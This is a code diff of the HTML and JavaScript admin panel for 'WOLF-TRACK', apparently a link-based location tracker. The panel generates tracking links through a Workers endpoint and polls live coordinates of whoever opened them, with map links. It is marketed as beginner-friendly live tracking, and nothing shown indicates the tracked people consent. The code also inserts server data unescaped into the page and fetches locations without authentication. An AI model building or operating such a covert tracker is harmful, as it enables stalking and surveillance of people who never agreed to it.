@@ -1,82 +1,276 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Wolf-Track Admin</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WOLF-TRACK • Admin</title>
+
 <style>
-body{font-family:system-ui;background:#f4f6f8;margin:0}
-.box{max-width:400px;margin:60px auto;background:#fff;padding:20px;border-radius:12px}
-button{background:#2563eb;color:#fff;border:none;padding:10px 16px;border-radius:8px}
-input{width:100%;padding:10px;margin:10px 0}
-.loader{display:none;text-align:center}
-.user{border:1px solid #ddd;padding:10px;margin-top:10px;border-radius:8px}
+/* ================= ROOT ================= */
+:root{
+  --blue:#2563eb;
+  --blue-dark:#1e40af;
+  --bg:#f1f5f9;
+  --card:#ffffff;
+  --border:#e5e7eb;
+  --text:#0f172a;
+  --muted:#64748b;
+}
+
+/* ================= BASE ================= */
+*{box-sizing:border-box}
+body{
+  margin:0;
+  font-family:system-ui,-apple-system,Segoe UI;
+  background:var(--bg);
+  color:var(--text);
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+}
+
+/* ================= PAGE ================= */
+.page{
+  width:100%;
+  max-width:420px;
+  padding-bottom:40px;
+}
+
+/* ================= HEADER ================= */
+.header-bg{
+  height:160px;
+  background:linear-gradient(135deg,#3b82f6,#1e40af);
+  border-bottom-left-radius:40px;
+  border-bottom-right-radius:40px;
+}
+
+.logo-wrap{
+  display:flex;
+  justify-content:center;
+  margin-top:-70px;
+}
+
+.logo{
+  width:120px;
+  height:120px;
+  border-radius:50%;
+  background:#fff;
+  border:5px solid #e5e7eb;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.logo img{
+  width:70%;
+}
+
+/* ================= CARD ================= */
+.card{
+  background:var(--card);
+  margin:16px;
+  padding:20px;
+  border-radius:18px;
+  box-shadow:0 10px 25px rgba(0,0,0,.08);
+}
+
+/* ================= TEXT ================= */
+.card h2{
+  margin:0 0 8px;
+  font-size:20px;
+}
+.card p{
+  font-size:14px;
+  color:var(--muted);
+}
+
+/* ================= LIST ================= */
+ul{
+  padding-left:18px;
+  margin:12px 0;
+}
+li{
+  font-size:14px;
+  margin-bottom:6px;
+}
+
+/* ================= INPUT ================= */
+.input-group{
+  margin-top:14px;
+  display:flex;
+  align-items:center;
+  border:1px solid var(--border);
+  border-radius:10px;
+  overflow:hidden;
+}
+input{
+  flex:1;
+  border:none;
+  padding:12px;
+  font-size:15px;
+  outline:none;
+}
+button{
+  border:none;
+  padding:12px 16px;
+  font-size:14px;
+  background:#d1d5db;
+  color:#fff;
+  cursor:pointer;
+}
+button.active{
+  background:var(--blue);
+}
+
+/* ================= LOADER ================= */
+.loader{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  font-size:14px;
+  color:var(--blue);
+  margin-top:10px;
+}
+.spinner{
+  width:18px;
+  height:18px;
+  border:3px solid #bfdbfe;
+  border-top-color:var(--blue);
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ================= USERS ================= */
+.user{
+  border:1px solid var(--border);
+  border-radius:14px;
+  padding:14px;
+  margin-bottom:12px;
+  font-size:14px;
+}
+.user small{color:var(--muted)}
+.user a{
+  color:var(--blue);
+  text-decoration:none;
+  font-weight:500;
+}
+
+/* ================= ALERT ================= */
+.alert{
+  margin-top:10px;
+  background:#dbeafe;
+  padding:10px;
+  border-radius:10px;
+  color:var(--blue-dark);
+  font-size:14px;
+}
+
+/* ================= DESKTOP ================= */
+@media(min-width:768px){
+  body{align-items:center}
+}
 </style>
 </head>
 
 <body>
 
-<div class="box" id="loginBox">
-  <h3>Admin Login</h3>
-  <input id="pass" type="password" placeholder="Password">
-  <button onclick="login()">Login</button>
-</div>
+<div class="page">
 
-<div class="box" id="panel" style="display:none">
-  <button onclick="generate()">Generate Link</button>
-  <input id="link" readonly>
-  <div class="loader" id="loader">Loading…</div>
-  <div id="users"></div>
+  <div class="header-bg"></div>
+
+  <div class="logo-wrap">
+    <div class="logo">
+      <!-- replace with your logo -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/Wolf_Icon.svg/512px-Wolf_Icon.svg.png">
+    </div>
+  </div>
+
+  <!-- LOGIN CARD -->
+  <div class="card" id="loginCard">
+    <h2>WOLF-TRACK</h2>
+    <p>Secure admin access required.</p>
+
+    <ul>
+      <li>Easy to use</li>
+      <li>Beginner friendly</li>
+      <li>Live tracking</li>
+    </ul>
+
+    <div class="input-group">
+      <input id="pass" placeholder="Enter your key…">
+      <button id="loginBtn">Enter</button>
+    </div>
+
+    <div id="loginStatus"></div>
+  </div>
+
+  <!-- ADMIN PANEL -->
+  <div class="card" id="adminCard" style="display:none">
+    <button class="active" onclick="generate()">Generate Tracking Link</button>
+    <input id="link" readonly style="margin-top:10px;display:none">
+
+    <div id="alert"></div>
+
+    <h3 style="margin-top:20px">Live Users</h3>
+    <div id="users">No users yet…</div>
+  </div>
+
 </div>
 
 <script>
-const API="https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
-let sessionId=null;
+const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
+const seen = new Set();
 
-function login(){
-  fetch(API+"/login",{
+/* ================= LOGIN ================= */
+loginBtn.onclick = async ()=>{
+  loginStatus.innerHTML =
+    `<div class="loader"><div class="spinner"></div>Checking…</div>`;
+
+  const r = await fetch(API+"/admin-login",{
     method:"POST",
-    headers:{'Content-Type':'application/json'},
+    headers:{"Content-Type":"application/json"},
     body:JSON.stringify({password:pass.value})
-  })
-  .then(r=>r.json())
-  .then(d=>{
-    sessionId=d.sessionId;
-    loginBox.style.display="none";
-    panel.style.display="block";
-    load();
-  })
-  .catch(()=>alert("Wrong password"));
-}
-
-function generate(){
-  loader.style.display="block";
-  fetch(API+"/create-link",{
-    method:"POST",
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({sessionId})
-  })
-  .then(r=>r.json())
-  .then(d=>{
-    link.value=d.link;
-    loader.style.display="none";
   });
-}
 
-async function load(){
-  const r=await fetch(API+"/admin-data");
-  const data=await r.json();
-  users.innerHTML="";
-  for(const t in data){
-    const u=data[t];
-    users.innerHTML+=`
-      <div class="user">
-        <b>${t}</b><br>
-        ${u.lat}, ${u.lng}<br>
-        Accuracy: ${u.acc}m
-      </div>`;
+  if(r.status===200){
+    loginCard.style.display="none";
+    adminCard.style.display="block";
+  }else{
+    loginStatus.innerHTML="❌ Wrong key";
   }
+};
+
+/* ================= GENERATE ================= */
+function generate(){
+ fetch(API+"/create-link",{method:"POST"})
+ .then(r=>r.json())
+ .then(d=>{
+   link.style.display="block";
+   link.value=d.link;
+ });
 }
 
+/* ================= LOAD USERS ================= */
+async function load(){
+ const r = await fetch(API+"/get-all-locations");
+ const data = await r.json();
+ users.innerHTML="";
+
+ for(const t in data){
+  const u = data[t];
+  users.innerHTML+=`
+   <div class="user">
+    <small>Token</small><br><b>${t}</b><br><br>
+    <small>Coords</small><br>${u.lat}, ${u.lng}<br>
+    <small>Accuracy</small><br>${u.acc}m<br><br>
+    <a target="_blank"
+     href="https://www.google.com/maps?q=${u.lat},${u.lng}">
+     Open in Google Maps
+    </a>
+   </div>`;
+ }
+}
 setInterval(load,2000);
 </script>
 
